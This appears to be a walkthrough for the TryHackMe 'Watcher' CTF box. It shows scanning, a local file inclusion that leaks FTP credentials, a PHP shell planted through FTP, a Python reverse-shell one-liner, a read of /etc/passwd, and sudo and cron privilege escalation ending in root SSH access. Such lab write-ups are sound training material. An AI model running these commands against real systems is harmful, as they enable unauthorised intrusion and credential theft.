---
title: "[THM] Watcher"
date: 2023-05-01T17:27:49+05:30
description: "THM watcher box solution"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
tocFolding: false
tocPosition: inner
tocLevels: ["h2", "h3", "h4"]
tags:
- python
- shell
series:
- tryhackme
categories:
- writeup
- boxes
image:
---

### Nmap scan:
```
# Nmap 7.80 scan initiated Wed Apr 26 23:09:33 2023 as: nmap -sV -sC -oA nmap/nmap 10.10.54.168
Nmap scan report for 10.10.54.168
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 26 23:09:58 2023 -- 1 IP address (1 host up) scanned in 24.59 seconds
```

### GOBuster
Do gobuster for files and check robots.txt for the files.
```
gobuster dir -u http://10.10.54.168 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
```

### FTP
Local file inclusion to get the ftp user `ftpuser:******`:
```
http://10.10.54.168/post.php?post=secret_file_do_not_read.txt
```
now that you get the ftp user's creds use those to login and get `flag_2.txt`
After that see that you can write to `files` directory and upload `shell.php` file so that you can setup revershell.

```
http://10.10.61.151/post.php?post=/home/ftpuser/ftp/files/shell.php
```

`cd home && ls` found users:
- ftpuser
- mat
- toby
- will

```
python3 -c 'import pty; pty.spawn("/bin/bash");'
```

```
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
cp -r /home/mat/ /tmp/mat/
```


```
find / -name "flag_3.txt"
```

Test for crontabs
```
www-data@watcher:/$ crontab -l
no crontab for www-data
```

### cat /etc/passwd

```
www-data@watcher:/home/mat/scripts$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
```


```
www-data@watcher:/home/mat$ cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

```
www-data@watcher:/home/toby$ cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

```
www-data@watcher:/home/toby/jobs$ cat cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

```
www-data@watcher:/home/mat$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```


Use FTP on `/home/mat` and put `cow.jpg` to the ftp server this copies the files from mat to ftp user.

Also we have execute permissions on `/home/toby/jobs/cow.sh`

```
-rwxr-xr-x 1 toby toby   46 Dec  3  2020 cow.sh
```
Set the following reverse shell to escalate as mat using reverse shell

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.0.0.0", 4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

now as mat can edit the `cmd.py` file we can add a shell in the file to run bash as `will`

```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py
```

finally we can read the `/opt/backups/key.b64` to get the ssh key for the root user.

```
chmod 700 ~/.ssh/watcher.pub 
ssh -i ~/.ssh/watcher.pub root@ip
```

